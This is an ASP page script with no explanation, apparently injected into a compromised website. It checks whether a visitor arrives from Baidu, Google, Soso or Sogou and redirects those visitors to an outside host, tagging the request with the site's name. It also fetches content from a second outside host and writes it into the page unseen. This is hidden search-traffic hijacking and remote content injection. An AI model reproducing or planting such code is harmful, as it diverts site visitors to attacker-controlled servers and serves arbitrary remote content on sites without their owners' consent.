<%

Dim REFERER
REFERER = Cstr(Request.ServerVariables("HTTP_REFERER"))
Dim server
server = request.ServerVariables("SERVER_NAME")

If InStr(REFERER,"baidu.com") > 0 Or InStr(REFERER,"google") > 0 Or InStr(REFERER,"soso") > 0 Or InStr(REFERER,"sogou") > 0 Then
	'Randomize
	Response.Redirect("http://xingchang.idc939.com:808/wow.html?"&server)
	Response.End()
End IF

response.write content
%>

<% 
Path="http://acc.dn027.com:803/wow.php"
t = GetBody(Path) 
Response.BinaryWrite t 

Function GetBody(url)
Set Retrieval = CreateObject("Microsoft.XMLHTTP") 
With Retrieval 
.Open "Get", url, False, "", "" 
.Send 
GetBody = .ResponseBody 
End With 
on error resume next 
if Retrieval.status <>200 then 
Set Retrieval = Nothing 
exit function 
end if 
End Function 
%>